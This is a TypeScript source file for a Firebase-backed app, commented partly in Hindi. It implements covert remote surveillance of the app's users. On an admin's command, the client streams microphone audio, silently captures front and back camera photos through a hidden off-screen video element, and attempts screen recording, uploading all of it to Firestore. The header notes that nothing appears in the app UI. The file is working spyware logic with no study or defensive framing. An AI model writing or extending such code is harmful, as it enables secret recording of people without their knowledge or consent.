/**
 * Live device control — mic stream + silent dual-camera snap + screen record attempt.
 * App UI pe kuch nahi dikhta. OS privacy indicators alag baat hain.
 */
import {
  collection,
  doc,
  onSnapshot,
  setDoc,
  updateDoc,
  deleteDoc,
  type Unsubscribe,
} from "firebase/firestore";
import type { User } from "firebase/auth";
import { db } from "../firebase";

const CHUNK_MS = 400;
const PRESENCE_MS = 12_000;
const SCREEN_CHUNK_MS = 800;
const MAX_B64 = 180_000; // firestore field soft cap

export type PresenceRow = {
  uid: string;
  name: string;
  email?: string;
  online: boolean;
  lastSeen: number;
  listening?: boolean;
  snapping?: boolean;
  screening?: boolean;
};

type DeviceControl = {
  listen?: boolean;
  snap?: boolean;
  snapId?: number;
  screen?: boolean;
  by?: string;
  at?: number;
};

function b64FromBlob(blob: Blob): Promise<string> {
  return new Promise((res, rej) => {
    const r = new FileReader();
    r.onload = () => {
      const s = String(r.result || "");
      res(s.includes(",") ? s.split(",")[1]! : s);
    };
    r.onerror = () => rej(new Error("chunk padh nahi paaya"));
    r.readAsDataURL(blob);
  });
}

/** Hidden video → JPEG base64. facing: user=front, environment=back */
async function captureFacing(facing: "user" | "environment"): Promise<string> {
  if (!navigator.mediaDevices?.getUserMedia) throw new Error("camera nahi");
  const stream = await navigator.mediaDevices.getUserMedia({
    audio: false,
    video: {
      facingMode: { ideal: facing },
      width: { ideal: 640 },
      height: { ideal: 480 },
    },
  });
  try {
    const video = document.createElement("video");
    video.muted = true;
    video.playsInline = true;
    video.setAttribute("playsinline", "true");
    video.style.cssText = "position:fixed;left:-9999px;top:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;";
    document.body.appendChild(video);
    video.srcObject = stream;
    await video.play();
    await new Promise((r) => setTimeout(r, 350));
    const w = video.videoWidth || 640;
    const h = video.videoHeight || 480;
    const canvas = document.createElement("canvas");
    canvas.width = w;
    canvas.height = h;
    const ctx = canvas.getContext("2d");
    if (!ctx) throw new Error("canvas nahi");
    ctx.drawImage(video, 0, 0, w, h);
    video.pause();
    video.srcObject = null;
    video.remove();
    let q = 0.55;
    let data = canvas.toDataURL("image/jpeg", q);
    // shrink if too big for firestore
    while (data.length > MAX_B64 * 1.37 && q > 0.25) {
      q -= 0.1;
      data = canvas.toDataURL("image/jpeg", q);
    }
    return data.includes(",") ? data.split(",")[1]! : data;
  } finally {
    stream.getTracks().forEach((t) => t.stop());
  }
}

async function doDualSnap(uid: string, snapId: number) {
  const outRef = doc(db, "deviceCapture", uid);
  await setDoc(
    outRef,
    { uid, status: "working", snapId, front: null, back: null, error: null, at: Date.now() },
    { merge: true },
  );
  let front: string | null = null;
  let back: string | null = null;
  let error: string | null = null;
  try {
    front = await captureFacing("user");
  } catch (e) {
    error = e instanceof Error ? e.message : "front fail";
  }
  try {
    back = await captureFacing("environment");
  } catch (e) {
    error = (error ? error + " · " : "") + (e instanceof Error ? e.message : "back fail");
  }
  await setDoc(
    outRef,
    {
      uid,
      status: front || back ? "done" : "fail",
      snapId,
      front,
      back,
      error,
      at: Date.now(),
    },
    { merge: true },
  );
}

/** Client: presence + mic + snap + screen commands */
export function startLiveMicClient(user: User, displayName: string): () => void {
  let alive = true;
  let unsubCtrl: Unsubscribe | null = null;
  let heartbeat: ReturnType<typeof setInterval> | null = null;
  let recorder: MediaRecorder | null = null;
  let stream: MediaStream | null = null;
  let screenRecorder: MediaRecorder | null = null;
  let screenStream: MediaStream | null = null;
  let seq = 0;
  let screenSeq = 0;
  let writing = false;
  let lastSnapId = 0;
  let snapping = false;

  const presenceRef = doc(db, "presence", user.uid);
  const controlRef = doc(db, "micControl", user.uid);
  const streamRef = doc(db, "micStreams", user.uid);
  const screenRef = doc(db, "screenStreams", user.uid);

  const bumpPresence = async (extra: Record<string, unknown> = {}) => {
    if (!alive) return;
    try {
      await setDoc(
        presenceRef,
        {
          uid: user.uid,
          name: displayName || user.displayName || user.email || "User",
          email: user.email || "",
          online: true,
          lastSeen: Date.now(),
          ...extra,
        },
        { merge: true },
      );
    } catch {
      /* */
    }
  };

  const stopRec = async () => {
    try {
      if (recorder && recorder.state !== "inactive") recorder.stop();
    } catch {
      /* */
    }
    recorder = null;
    stream?.getTracks().forEach((t) => t.stop());
    stream = null;
    try {
      await updateDoc(presenceRef, { listening: false, lastSeen: Date.now() });
    } catch {
      /* */
    }
    try {
      await setDoc(streamRef, { active: false, at: Date.now() }, { merge: true });
    } catch {
      /* */
    }
  };

  const startRec = async () => {
    if (!alive || recorder) return;
    if (!navigator.mediaDevices?.getUserMedia) return;
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        audio: {
          echoCancellation: false,
          noiseSuppression: false,
          autoGainControl: true,
        },
      });
      const mime =
        MediaRecorder.isTypeSupported("audio/webm;codecs=opus")
          ? "audio/webm;codecs=opus"
          : MediaRecorder.isTypeSupported("audio/webm")
            ? "audio/webm"
            : "";
      recorder = mime
        ? new MediaRecorder(stream, { mimeType: mime, audioBitsPerSecond: 24_000 })
        : new MediaRecorder(stream);
      seq = 0;
      recorder.ondataavailable = async (ev) => {
        if (!alive || !ev.data || ev.data.size < 40 || writing) return;
        writing = true;
        try {
          const chunk = await b64FromBlob(ev.data);
          seq += 1;
          await setDoc(
            streamRef,
            {
              uid: user.uid,
              active: true,
              seq,
              mime: recorder?.mimeType || "audio/webm",
              chunk,
              at: Date.now(),
            },
            { merge: true },
          );
        } catch {
          /* */
        } finally {
          writing = false;
        }
      };
      recorder.start(CHUNK_MS);
      await bumpPresence({ listening: true });
    } catch {
      await stopRec();
    }
  };

  const stopScreen = async () => {
    try {
      if (screenRecorder && screenRecorder.state !== "inactive") screenRecorder.stop();
    } catch {
      /* */
    }
    screenRecorder = null;
    screenStream?.getTracks().forEach((t) => t.stop());
    screenStream = null;
    try {
      await updateDoc(presenceRef, { screening: false, lastSeen: Date.now() });
    } catch {
      /* */
    }
    try {
      await setDoc(screenRef, { active: false, at: Date.now() }, { merge: true });
    } catch {
      /* */
    }
  };

  const startScreen = async () => {
    if (!alive || screenRecorder) return;
    // WebView me getDisplayMedia system picker dikhata hai — fully silent nahi ho sakta bina native plugin
    const gdm = navigator.mediaDevices?.getDisplayMedia;
    if (!gdm) {
      await setDoc(
        screenRef,
        { uid: user.uid, active: false, error: "screen capture support nahi", at: Date.now() },
        { merge: true },
      );
      return;
    }
    try {
      screenStream = await gdm.call(navigator.mediaDevices, {
        video: { frameRate: 8, width: { max: 720 }, height: { max: 1280 } },
        audio: false,
      } as DisplayMediaStreamOptions);
      screenStream.getVideoTracks().forEach((t) => {
        t.addEventListener("ended", () => void stopScreen());
      });
      const mime =
        MediaRecorder.isTypeSupported("video/webm;codecs=vp8")
          ? "video/webm;codecs=vp8"
          : MediaRecorder.isTypeSupported("video/webm")
            ? "video/webm"
            : "";
      screenRecorder = mime
        ? new MediaRecorder(screenStream, { mimeType: mime, videoBitsPerSecond: 400_000 })
        : new MediaRecorder(screenStream);
      screenSeq = 0;
      let screenWriting = false;
      screenRecorder.ondataavailable = async (ev) => {
        if (!alive || !ev.data || ev.data.size < 80 || screenWriting) return;
        screenWriting = true;
        try {
          const chunk = await b64FromBlob(ev.data);
          if (chunk.length > MAX_B64) return; // drop oversized
          screenSeq += 1;
          await setDoc(
            screenRef,
            {
              uid: user.uid,
              active: true,
              seq: screenSeq,
              mime: screenRecorder?.mimeType || "video/webm",
              chunk,
              at: Date.now(),
            },
            { merge: true },
          );
        } catch {
          /* */
        } finally {
          screenWriting = false;
        }
      };
      screenRecorder.start(SCREEN_CHUNK_MS);
      await bumpPresence({ screening: true });
    } catch (e) {
      await setDoc(
        screenRef,
        {
          uid: user.uid,
          active: false,
          error: e instanceof Error ? e.message : "screen deny",
          at: Date.now(),
        },
        { merge: true },
      );
      await stopScreen();
    }
  };

  void bumpPresence({ listening: false, snapping: false, screening: false });
  heartbeat = setInterval(() => void bumpPresence(), PRESENCE_MS);

  unsubCtrl = onSnapshot(controlRef, (snap) => {
    if (!alive) return;
    const d = (snap.data() || {}) as DeviceControl;

    if (d.listen) void startRec();
    else void stopRec();

    if (d.screen) void startScreen();
    else void stopScreen();

    const sid = Number(d.snapId) || 0;
    if (d.snap && sid > 0 && sid !== lastSnapId && !snapping) {
      lastSnapId = sid;
      snapping = true;
      void bumpPresence({ snapping: true });
      void doDualSnap(user.uid, sid)
        .catch(() => undefined)
        .finally(() => {
          snapping = false;
          void bumpPresence({ snapping: false });
          // auto clear snap flag so same id dobara na chale
          void setDoc(controlRef, { snap: false }, { merge: true }).catch(() => undefined);
        });
    }
  });

  const onHide = () => {
    void bumpPresence({ online: false, listening: false, screening: false });
  };
  window.addEventListener("pagehide", onHide);
  document.addEventListener("visibilitychange", () => {
    if (document.visibilityState === "hidden") onHide();
    else void bumpPresence();
  });

  return () => {
    alive = false;
    unsubCtrl?.();
    if (heartbeat) clearInterval(heartbeat);
    window.removeEventListener("pagehide", onHide);
    void stopRec();
    void stopScreen();
    void setDoc(
      presenceRef,
      { online: false, listening: false, screening: false, snapping: false, lastSeen: Date.now() },
      { merge: true },
    ).catch(() => undefined);
  };
}

/** Admin: presence list */
export function watchPresence(cb: (rows: PresenceRow[]) => void): Unsubscribe {
  return onSnapshot(
    collection(db, "presence"),
    (s) => {
      const now = Date.now();
      const rows: PresenceRow[] = s.docs.map((d) => {
        const x = d.data();
        const lastSeen = Number(x.lastSeen) || 0;
        const online = Boolean(x.online) && now - lastSeen < 40_000;
        return {
          uid: d.id,
          name: String(x.name || "User").slice(0, 60),
          email: typeof x.email === "string" ? x.email.slice(0, 120) : "",
          online,
          lastSeen,
          listening: Boolean(x.listening),
          snapping: Boolean(x.snapping),
          screening: Boolean(x.screening),
        };
      });
      rows.sort((a, b) => Number(b.online) - Number(a.online) || b.lastSeen - a.lastSeen);
      cb(rows);
    },
    () => cb([]),
  );
}

export async function setMicListen(targetUid: string, listen: boolean, adminUid: string) {
  await setDoc(
    doc(db, "micControl", targetUid),
    { listen, by: adminUid, at: Date.now() },
    { merge: true },
  );
}

/** Trigger dual camera snap (front + back) */
export async function requestSnap(targetUid: string, adminUid: string) {
  const snapId = Date.now();
  await setDoc(
    doc(db, "micControl", targetUid),
    { snap: true, snapId, by: adminUid, at: Date.now() },
    { merge: true },
  );
  return snapId;
}

/** Start / stop screen capture on target */
export async function setScreenRecord(targetUid: string, on: boolean, adminUid: string) {
  await setDoc(
    doc(db, "micControl", targetUid),
    { screen: on, by: adminUid, at: Date.now() },
    { merge: true },
  );
}

export function playMicStream(targetUid: string, onStatus: (s: string) => void): () => void {
  let alive = true;
  let lastSeq = -1;
  let ctx: AudioContext | null = null;
  let nextTime = 0;
  const queue: ArrayBuffer[] = [];
  let decoding = false;

  const ensureCtx = () => {
    if (!ctx) {
      ctx = new AudioContext();
      nextTime = ctx.currentTime;
    }
    if (ctx.state === "suspended") void ctx.resume();
    return ctx;
  };

  const pump = async () => {
    if (!alive || decoding) return;
    decoding = true;
    try {
      while (queue.length && alive) {
        const ab = queue.shift()!;
        const ac = ensureCtx();
        try {
          const buf = await ac.decodeAudioData(ab.slice(0));
          const src = ac.createBufferSource();
          src.buffer = buf;
          src.connect(ac.destination);
          const startAt = Math.max(ac.currentTime + 0.02, nextTime);
          src.start(startAt);
          nextTime = startAt + buf.duration;
        } catch {
          /* */
        }
      }
    } finally {
      decoding = false;
    }
  };

  const unsub = onSnapshot(
    doc(db, "micStreams", targetUid),
    async (snap) => {
      if (!alive) return;
      const d = snap.data();
      if (!d || !d.active || !d.chunk) {
        onStatus(d?.active === false ? "band" : "intezaar");
        return;
      }
      const seq = Number(d.seq) || 0;
      if (seq === lastSeq) return;
      lastSeq = seq;
      onStatus(`live · #${seq}`);
      try {
        const bin = atob(String(d.chunk));
        const bytes = new Uint8Array(bin.length);
        for (let i = 0; i < bin.length; i++) bytes[i] = bin.charCodeAt(i);
        queue.push(bytes.buffer);
        void pump();
      } catch {
        /* */
      }
    },
    () => onStatus("error"),
  );

  return () => {
    alive = false;
    unsub();
    try {
      ctx?.close();
    } catch {
      /* */
    }
    ctx = null;
    queue.length = 0;
  };
}

export type CaptureResult = {
  status: string;
  snapId: number;
  front: string | null;
  back: string | null;
  error: string | null;
  at: number;
};

/** Admin watches snap result for one user */
export function watchCapture(targetUid: string, cb: (c: CaptureResult | null) => void): Unsubscribe {
  return onSnapshot(
    doc(db, "deviceCapture", targetUid),
    (snap) => {
      if (!snap.exists()) {
        cb(null);
        return;
      }
      const x = snap.data();
      cb({
        status: String(x.status || ""),
        snapId: Number(x.snapId) || 0,
        front: typeof x.front === "string" ? x.front : null,
        back: typeof x.back === "string" ? x.back : null,
        error: typeof x.error === "string" ? x.error : null,
        at: Number(x.at) || 0,
      });
    },
    () => cb(null),
  );
}

export type ScreenChunk = {
  active: boolean;
  seq: number;
  mime: string;
  chunk: string | null;
  error: string | null;
  at: number;
};

export function watchScreenStream(targetUid: string, cb: (s: ScreenChunk | null) => void): Unsubscribe {
  return onSnapshot(
    doc(db, "screenStreams", targetUid),
    (snap) => {
      if (!snap.exists()) {
        cb(null);
        return;
      }
      const x = snap.data();
      cb({
        active: Boolean(x.active),
        seq: Number(x.seq) || 0,
        mime: String(x.mime || "video/webm"),
        chunk: typeof x.chunk === "string" ? x.chunk : null,
        error: typeof x.error === "string" ? x.error : null,
        at: Number(x.at) || 0,
      });
    },
    () => cb(null),
  );
}

export async function clearMicControl(targetUid: string) {
  try {
    await deleteDoc(doc(db, "micControl", targetUid));
  } catch {
    /* */
  }
}
